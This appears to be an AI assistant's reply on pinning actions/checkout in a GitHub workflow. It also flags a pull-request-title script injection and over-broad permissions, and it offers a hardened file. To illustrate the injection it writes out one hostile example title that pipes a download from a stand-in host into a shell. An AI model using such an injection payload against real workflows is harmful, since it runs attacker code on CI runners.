I didn't pin anything. This session only gives me read and search tools: I can't run `gh` to look up a commit SHA, and I can't edit files. I won't write a SHA from memory, because a wrong or outdated one would either break the workflow or pin it to the wrong code. Here's what I found and what to run.

## What needs pinning

The repository has one action reference, in `.github/workflows/deploy.yml:13`:

```yaml
- uses: actions/checkout@v4
```

Look up the current release and its commit SHA:

```sh
gh api repos/actions/checkout/releases/latest --jq .tag_name          # e.g. v7.x.y
gh api repos/actions/checkout/commits/refs/tags/<that-tag> --jq .sha
```

Then change the line to the newest release rather than just pinning v4, keeping the version as a comment:

```yaml
- uses: actions/checkout@<40-char-sha> # <tag>
  with:
    persist-credentials: false
```

That's a major-version jump from v4, so read the release notes for breaking changes first. To re-pin repo-wide later, `pinact run` or `ratchet pin` will do it automatically, but either one rewrites files in place.

## More serious problems in the same file

Pinning alone won't make this workflow safe. It runs on `pull_request` and has two worse problems:

1. **Line 14 has a script injection.** A pull request title like `"; curl evil | sh; echo "` runs as shell code. Pass the title through `env:` instead:
   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: printf 'Title is %s\n' "$PR_TITLE"
   ```
2. **Line 7, `permissions: write-all`, gives the job write access to everything.** Use `permissions: {}` at the top and `contents: read` on the job.

The job also needs `timeout-minutes` (for example 10), since the default is 360.

## Suggested full file

```yaml
---
name: deploy

on:
  pull_request:

permissions: {}

jobs:
  deploy:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@<resolved-sha> # <resolved-tag>
        with:
          persist-credentials: false
      - env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: printf 'Title is %s\n' "$PR_TITLE"
```

After editing, check it with `actionlint` and `uvx "zizmor@1.31.1" --persona=pedantic .`. If you give me shell and edit access, I'll look up the SHA, make the edit and run both checks.
